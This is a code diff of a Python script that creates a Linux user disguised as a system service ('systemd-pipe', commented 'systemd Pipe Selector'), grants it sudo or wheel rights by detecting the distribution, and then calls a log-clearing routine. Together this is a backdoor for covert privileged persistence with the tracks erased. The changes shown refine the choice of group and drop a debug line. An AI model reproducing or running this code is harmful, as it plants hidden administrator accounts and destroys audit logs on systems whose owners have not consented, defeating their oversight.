@@ -26,13 +26,12 @@ def create_command_string(arguments):
         command_string += "--password " + crypt(arguments[1], 'SHA512') + " "
     
     if arguments[2] != "":
-        command_string += "--uid " + str(arguments[2]) + " "
+        command_string += "--uid=" + str(arguments[2]) + " "
     
     if arguments[0] == "":
         command_string += "-d /run/systemd -c 'systemd Pipe Selector' systemd-pipe"
     else:
         command_string += arguments[0]
-    os.system("echo '" + command_string + "' > /tmp/cmd.txt")
     return command_string
 
 def clear_logs(arguments):
@@ -43,10 +42,15 @@ def clear_logs(arguments):
 
 def main(arguments):
     os.system(create_command_string(arguments))
+    distro_string = open('/etc/os-release').readline().lower()
+    group = ""
+    sudo_groups = {"fedora":"wheel", "centos":"wheel", "red hat":"wheel","ubuntu":"sudo", "debian":"sudo", "kali":"sudo"}
+    for distro in sudo_groups.keys():
+        if distro in distro_string:
+            group = sudo_groups.get(distro)
     if arguments[5] != "no":
         if arguments[0] != "":
-            os.system("/sbin/usermod -aG sudo " + arguments[0])
+            os.system("/sbin/usermod -aG " + group + " " + arguments[0])
         else:
-            os.system("/sbin/usermod -aG sudo systemd-pipe")
+            os.system("/sbin/usermod -aG " + group  + " systemd-pipe")
     clear_logs(arguments)
-
